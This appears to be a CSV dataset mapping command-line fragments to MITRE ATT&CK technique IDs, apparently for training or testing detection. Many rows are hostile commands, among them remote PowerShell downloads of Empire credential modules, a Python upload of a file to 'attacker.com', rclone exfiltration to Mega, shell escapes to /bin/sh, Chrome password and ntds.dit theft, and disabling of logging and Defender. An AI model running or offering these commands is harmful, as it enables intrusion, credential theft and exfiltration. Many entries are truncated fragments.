command,mitre_id
"$DirectorySearcher.PropertiesToLoad.Add(""Name"")",T1018
"return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);",T1562
"Copy-Item -Path ""C:\windows\system32\calc.exe"" -Destination ""$dest_path\explorer.exe"" -Force",T1218
"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""",T1218
/proc/,T1119
base64,T1027
show processes,T1057
Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd,T1546
Register-ScheduleTask,T1053
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1012
pw adduser art -g wheel -s /bin/sh,T1110
pr,T1046
"cmd.exe /c ""net use \\$computer_name\$share_name $password /u:$user_name""",T1021
else{,T1137
msxsl.exe script[.]jpeg script[.]jpeg,T1220
"$web_client.UploadFile($uri, $file.FullName)}}",T1048
%temp%\GoogleChrome,T1074
Extexport.exe {PATH_ABSOLUTE:folder} foo bar,T1218
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1060
RegisterClassW,T1106
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> $output_file; fi,T1082
catch { $_; exit $_.Exception.HResult},T1036
csi.exe {PATH:.cs},T1127
cp $payload /tmp/hello.c,T1548
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f,T1112
"detectorId=$(aws guardduty create-detector --enable --region ""$region"" | grep -oP '(?<=""DetectorId"": "")[^""]*')",T1562
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc,T1059
GetLogicalDrives(),T1106
echo '/bin/sh 1>&0' >/path/to/temp-file,T1059
sudo touch /tmp/password-auth.bk,T1056
"Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append $File_to_output",T1083
Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},T1127
Runonce.exe /AlternateShellStartup,T1218
Remove-NetEventSession -Name Capture007,T1040
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.,T1218
RegisterServiceCtrlHandler,T1106
%temp%\T1036.007_masquerading.pdf.exe,T1036
logrotate -l /path/to/output-file DATA,T1222
esxcli system syslog config reload,T1562
"[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null",T1110
nltest /dclist,T1018
ImagePath = $p.ImagePath,T1007
kldstat,T1082
Scan-Dir $_,T1083
execve,T1574
query user >> %file%,T1033
DriveList,T1680
ATBroker.exe /start malware,T1218
unsquashfs shell,T1548
(0xd0b0),T1036
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing),T1558
preinst,T1546
>%TEMP%\golden.txt 2>&1 (,T1558
networksetup -setwebproxy $interface $proxy_server $proxy_port,T1090
"echo -e 'package main\nimport (\n\t""fmt""\n\t""os""\n)\n\nfunc main(){\n\tb, _ := os.ReadFile(""/path/to/input-file"")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go",T1005
Get-EventLog security -instanceid 4624,T1033
"copy ""$exe_path"" %temp%\T1036.007_masquerading.docx.exe /Y",T1036
service art-test start,T1543
"local d,x=c:receive(""*a"");",T1105
ExecStop,T1543
"echo ""#!/bin/bash"" > /etc/init.d/T1543.002",T1543
tbl /path/to/input-file,T1005
passhunt -local $true -noninteractive,T1552
"echo 'start_cmd=""art_test_start""' >> $rc_service_path/$rc_service_file",T1543
GetComputerNameExW,T1106
"copy ""$ps1_path"" %temp%\T1036.007_masquerading.rtf.ps1 /Y",T1036
".\kerbrute.exe bruteforce --dc $domaincontroller -d $domain ""PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt""",T1110
MiniDumpWriteDump Win32,T1003
echo $(echo $ENCODED) | b64decode -r,T1140
Connect-MsolService -Credential $Credential,T1098
CScript.exe AtomicTestT1105.js //E:JScript,T1105
/HMODULE,T1218
Microsoft.Storage/storageAccounts/listkeys/action,T1552
"echo ""[Unit]"" > $systemd_service_path/$systemd_service_file",T1543
New-Item -Path $filePath -ItemType File -Force,T1105
iptables-save > /tmp/iptables.rules,T1562
az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath,T1530
"echo ""WantedBy=default.target"" >> $systemd_service_path/$systemd_service_file",T1543
"echo ""Requires=$systemd_service_name"" >> $path_to_systemd_timer",T1053
CreateFile,T1106
PnPUtil.exe,T1543
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) $optional_args",T1018
"New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value ""36190899-1602-49e8-8b27-eb1d0a1ce869=1"" -Force",T1562
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp,T1060
"else {$responseBody = ""The storage account could not be anonymously accessed.""}}",T1619
show aaa common-criteria policy all,T1201
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force,T1491
GetIpNetTable,T1016
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f",T1112
/tmp/1,T1074
New-WebGlobalModule -Name $module_name -Image $dll_path,T1505
diskshadow.exe /s {PATH:.txt},T1003
& curl.exe -L $url --output $toolsDir,T1113
apache2ctl -c 'Include /path/to/input-file',T1005
"), order and casing of characters (",T1027
post/windows/gather/credentials/gpp,T1552
Dim taskName As String,T1137
var FileOutputStream = Java.type('java.io.FileOutputStream');,T1105
Microsoft.Compute/restorePointCollections/delete,T1490
wsmprovhost.exe,T1574
"echo ""$command"" > /etc/cron.daily/$cron_script_name",T1053
"borg extract @:/::: --rsh ""/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'""",T1059
"Write-Host "" [-] Attempting ${password} on account ${user}.""",T1110
NetUserDel,T1106
"Write-Host ""Waiting 15s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
Remove-Item $profile\logins.json > $null,T1555
.zshrc,T1546
"""delete shadows all"" | diskshadow.exe",T1490
"Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"" # Required due to length limitation",T1098
Start-Sleep -s 3,T1548
assoc $extension_to_change=$target_extension_handler,T1546
"if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"" -destination ""$exfil_folder\T1555.003Chrome_Login Data For Account""} else {}",T1555
System Events,T1547
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile $extract_path\ntds.dit,T1003
cp $calc_plist_path ~/Library/Preferences/ByHost/com.apple.loginwindow.plist,T1547
"echo """" > $history_path",T1070
type \\<hostname>\c$\Users\<username>\Favorites\Links\Bookmarks bar\Imported From IE\*citrix*,T1217
chmod +x 'testdirwithspaceend /init ',T1036
/usr/sbin/setenforce,T1083
te.exe {PATH:.wsc},T1127
"if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;",T1069
echo overwriting...,T1547
DSEnumerateDomainTrusts(),T1482
Start-Sleep -Second 20,T1134
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders,T1060
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""",T1137
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier},T1547
exit 0,T1036
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe},T1105
"echo ""$encryption_password"" | gpg --batch --yes --passphrase-fd 0 --output $test_folder/$test_file.zip.gpg -c $test_folder/$test_file.zip",T1560
"$sheet.Cells.Item(4,1) = ""=IF(ISNUMBER(SEARCH(`""64`"",GET.WORKSPACE(1))), GOTO(A5),)""",T1204
HKEY_CLASSES_ROOT\\[handler],T1546
GetSystemTimeAsFileTime,T1497
/proc/<PID>/mem,T1003
"gawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",T1222
"cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2R:1""",T1569
type,T1140
Get-DataInfo.ps1,T1518
Get-GlobalAddressList,T1087
"DefaultPack.EXE /C:""{CMD}""",T1218
CreateWindowExW,T1106
com.apple.loginwindow.[UUID].plist,T1547
"if ($value -eq ""1"")",T1137
"reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\$ETWProviderGUID"" /v ""Enabled"" /t REG_DWORD /d ""0"" /f",T1562
net time \\127.0.0.1,T1124
"""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\$target add $task_name ""cmd.exe"" ""/c $task_command"" $user_name logon",T1053
C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL,T1218
payload,T1132
~/Library/LaunchAgents/,T1543
.txt,T1036
nano -s /bin/sh,T1059
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control SystemStartOptions,T1012
%appdata%\Roaming\Microsoft\Templates\,T1053
ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd',T1518
/bin/sh,T1059
"sysrc syslogd_enable=""NO""",T1562
foreach ($chunk in $chunks) {,T1041
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f",T1484
"Write-Host ""$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)"" -ForegroundColor Yellow",T1562
AppServicesr,T1036
"""$rar_exe"" a -hp""blue"" hello.rar",T1560
cmd.exe /K %APPDATA%\taskhostw.exe,T1036
kubectl,T1136
./stratus warmup aws.defense-evasion.vpc-remove-flow-logs,T1562
"if ($role -eq $null) { Write-Warning ""Role not found""; exit }",T1098
"Stop-Service -Name ""$service_name"" -force -erroraction silentlycontinue | Out-Null",T1543
"System.IO.File.ReadAllText(""/path/to/input-file"");;",T1005
SetWindowsHookExW,T1106
rpmdb --eval '%{lua:...}',T1548
"echo ""\$ART=$ART""",T1059
reg query HKLM\SYSTEM\CurrentControlSet\Services\[service name]\Parameters,T1012
pcalua.exe -a {PATH_SMB:.dll},T1202
bing[.]com?id=<GetTickCount>,T1016
/dev/shm,T1027
"rundll32.exe shell32.dll,Control_RunDLL ""$input_file""",T1218
C:\Users\Public\WinTN\WinTN.exe,T1105
prerm,T1546
virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/,T1222
if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi,T1049
wuauclt.exe,T1036
GetFileAttributesA,T1106
"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""$executable_binary"" /f",T1548
HKCR\enc\shell\open\command,T1112
CreateAccessKey,T1098
"Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""$ms_product"" -sub ""Scheduler""",T1053
cmd /c,T1059
"$bitmap.Save(""$output_file"")",T1113
Сhrome.Updаte.zip,T1036
Invoke-ATHHTMLApplication -ScriptEngine $script_engine -InlineProtocolHandler $protocol_handler -MSHTAFilePath $mshta_file_path,T1218
CREATE TABLE x(x TEXT);,T1005
dav_methods PUT;,T1105
takeown /F C:\Windows\System32\Narrator.exe /A,T1546
SCHTASKS /Create /SC ONCE /TN spawn /TR $task_command /ST $time,T1053
"if [ $(history |wc -l) -eq 0 ]; then echo ""History cache is empty""; fi",T1562
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf,T1059
"r.urlopen(""http://attacker.com"", open(""/path/to/input-file"", ""rb"").read())'",T1105
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties",T1087
dscl . list /Users | grep -v '_',T1087
"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""/path/to/input-file""));",T1005
Get-Clipboard | iex,T1115
"runTime = ""20:04""",T1137
tmux -S /path/to/socket,T1059
google[.]com,T1016
CreatePipe,T1559
[attrib](https://attack.mitre.org/software/S1176) +h,T1564
"mawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",T1222
Import-Module AADInternals -Force,T1552
"""$venv_path\Scripts\pypykatz"" live lsa",T1003
Install-SSP,T1547
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier},T1547
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0,T1112
sc config Spooler start=auto,T1574
"rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M",T1567
cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/,T1110
t:close();',T1105
"New-Item -ItemType Directory -Path ""$output_folder""",T1530
dir \\$domain\SYSVOL,T1558
reset.exe session,T1218
sudo chown root /tmp/hello.c,T1548
"""import os; os.system('calc.exe')"" | Out-File -FilePath ""$UserDir\usercustomize.py"" -Encoding ASCII",T1546
ru_RU,T1614
-ErrorAction SilentlyContinue,T1564
reg query HKCU /f password /t REG_SZ /s,T1552
"New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name ""VBAWarnings"" -Value ""1"" -PropertyType DWORD -Force | Out-Null",T1204
IOCTL_DISK_GET_LENGTH_INFO,T1680
%temp%\T1036.007_masquerading.ps1.exe,T1036
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\,T1547
Import-Module MSOnline,T1098
sdclt.exe,T1548
"timestomp -dest ""$file_path\kxwn.lock""",T1070
cat /etc/pam.d/common-password,T1201
/etc/paths.d,T1574
and stopping the,T1562
"New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -PropertyType DWord -Value 0 -Force",T1562
WNetAddConnection2,T1106
dscl . -create /Users/$username,T1136
.tmpl,T1036
eudcedit,T1548
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /ve /T REG_SZ /d ""C:\WINDOWS\system32\scrobj.dll"" /f",T1546
HKEY_CURRENT_USER\Software\Microsoft\Office\<Excel Version>\Excel\Security\AccessVBOM\,T1112
HKCU\Office365DCOMCheck,T1027
"New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""$command"" -PropertyType ""String""",T1546
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\,T1547
AlwaysInstallElevated,T1218
"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""",T1556
cp $(which sh) $HOME/...,T1036
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f",T1112
"New-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"" -Name ""atomic_test"" -Force",T1547
zless /path/to/input-file,T1548
"} elseif ($row.ContainerName -ne """" -and $row.BlobName -eq """") {",T1530
mspub.exe {REMOTEURL},T1105
if ($new) {,T1484
copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe,T1036
%APPDATA%\microsoft\word\startup\,T1137
"rsync -e '/bin/sh -c ""/bin/sh 0<&2 1>&2""' x:x",T1059
server {,T1105
SELECT * FROM x;,T1005
nano /path/to/input-file,T1005
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.,T1218
.conf,T1037
shutdown -h $timeout,T1529
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=organizationalUnit) $optional_args",T1482
while ((line = br.readLine()) != null) { print(line); }',T1005
loadfrommem,T1055
GetLocaleInfoA,T1614
Sysutils::DiskSize,T1680
DisableAPIServiceAccess,T1489
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,T1060
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""",T1137
net stop,T1489
java,T1036
%temp%\TrendMicroUpdate,T1074
locate *,T1083
"Write-Host ""[i] Establishing connection to: $ip : $port""",T1046
find $search_path -name id_rsa 2>/dev/null -exec rsync -R {} $output_folder \;,T1552
"New-LocalUser -Name ""Administrator "" -NoPassword",T1564
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1'),T1106
/Users/Shared/irc.pid,T1480
VSLaunchBrowser.exe .exe {PATH_SMB},T1127
net user /add /domain,T1136
neofetch --ascii /path/to/input-file,T1005
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""$output_file"" /target:library ""$source_file""",T1218
/root/.ssh,T1098
echo '...' >/path/to/file.py,T1548
testcat(){ (while read line; do echo $line >> $output_file; done < $1) },T1003
ruby -run -e httpd . -p 80,T1105
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1115\src\T1115-macrocode.txt"" -officeProduct ""Word"" -sub ""GetClipboard""",T1115
sysctl,T1622
systemctl enable T1543.002,T1543
<capacity unit='bytes'>5</capacity>,T1222
C:\\windows\\temp\\s\\,T1074
~/.config/autostart,T1547
openssl,T1140
iviewers.dll,T1036
certutil,T1140
%HiddenKey%,T1564
Set-Service -Name EventLog -Status Stopped,T1562
Mozilla/5.0 (compatible; MSIE 7.0; Win32),T1071
dsls,T1027
ssh $user_account@localhost,T1056
"echo ""*** Log Group Deleted ***""",T1562
Gpscript /startup,T1218
user root;,T1105
"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}",T1564
"dosbox -c 'mount c /' -c ""echo DATA >c:\path\to\output"" -c exit",T1222
C:\system,T1074
"reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
"auditpol /set /category:""Account Logon"" /success:disable /failure:disable",T1562
"$env:AWS_ACCESS_KEY_ID = ""$awsAccessKey""",T1567
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}",T1218
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"" /f",T1137
$tcp.Close(),T1046
ProcessIdleTasks,T1070
Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null,T1562
rasautou -d {PATH:.dll} -p export_name -a a -e e,T1218
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose,T1134
getinfo,T1124
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate,T1016
Get-ChildItem $AppData -Recurse -Force | ForEach-Object {,T1560
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username,T1136
/parentdomain,T1016
"call ""%microsoft_wordpath%\protocolhandler.exe"" ""ms-word:nft|u|$remote_url""",T1218
"Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable",T1112
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules",T1562
